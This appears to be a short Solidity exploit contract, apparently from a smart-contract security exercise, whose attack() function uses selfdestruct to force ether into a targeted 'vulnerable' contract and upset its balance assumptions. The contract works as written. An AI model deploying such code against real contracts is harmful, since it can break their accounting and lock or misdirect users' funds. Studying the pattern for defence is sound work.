pragma solidity ^0.8.0;




contract UseForce{
   address public vulnerableContract;
    constructor(address _vulnerableContract) {
     vulnerableContract = (payable(_vulnerableContract));
 }
    function attack()public payable {
        require(msg.value > 0);
        selfdestruct(payable(address(vulnerableContract)));
    }
}